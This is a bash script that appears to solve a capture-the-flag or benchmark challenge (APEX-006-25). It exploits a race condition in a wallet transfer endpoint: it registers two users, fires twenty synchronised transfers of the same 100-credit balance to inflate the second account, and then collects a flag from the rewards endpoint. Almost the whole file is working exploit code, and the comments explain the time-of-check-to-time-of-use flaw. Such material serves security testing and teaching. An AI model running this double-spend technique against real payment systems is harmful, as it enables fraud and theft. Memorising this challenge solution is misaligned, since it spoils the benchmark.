#!/usr/bin/env bash
# APEX-006-25 — "Race Condition Double-Spend" (tags: race_condition, toctou)
#
# `/api/wallet/transfer` reads the sender's balance, thinks about it for 50ms,
# compares, and only then subtracts. Between the read and the subtraction the
# balance on the row is still the old one, so every request that arrives inside
# that window reads 100, decides 100 is enough, and pays out. One account with
# 100 credits funds twenty transfers of 100, and `/api/rewards` hands the flag to
# anybody holding 1000.
#
# `--repeat 20 --race` is the whole exploit. The sends leave from twenty threads
# that meet at a barrier first, so they arrive inside one window instead of
# twenty consecutive ones — which a shell loop, paying process startup between
# each, could not do. Each is a receipt like any other, so the run is readable
# afterwards.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex006-$$"
SPENDER="spender$$"
SAVER="saver$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

token_of() {
    python3 -c 'import json,re,sys
body = sys.stdin.read().split("\n\n", 1)[-1]
print(json.loads(body).get("token", ""))'
}

register() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/register \
        --set header.Content-Type=application/json \
        --set "json.username=$1" --set "json.email=$1@example.test" \
        --set json.password=password123 | token_of
}

"$H5I" browser open "$URL/api" --session "$SESSION" --new --capture >/dev/null
SPENDER_TOKEN="$(register "$SPENDER")"
register "$SAVER" >/dev/null

# Twenty transfers of the whole balance, released together.
"$H5I" websec replay req_0 --session "$SESSION" --create --repeat 20 --race \
    --set method=POST --set path=/api/wallet/transfer \
    --set header.Content-Type=application/json \
    --set "header.Authorization=Bearer $SPENDER_TOKEN" \
    --set "json.to_username=$SAVER" --set json.amount=100 >/dev/null

# The saver never did anything but exist, and is now over the threshold.
SAVER_TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/login \
    --set header.Content-Type=application/json \
    --set "json.username=$SAVER" --set json.password=password123 | token_of)"
send "$SESSION" req_0 --create \
    --set path=/api/rewards \
    --set "header.Authorization=Bearer $SAVER_TOKEN" | flag
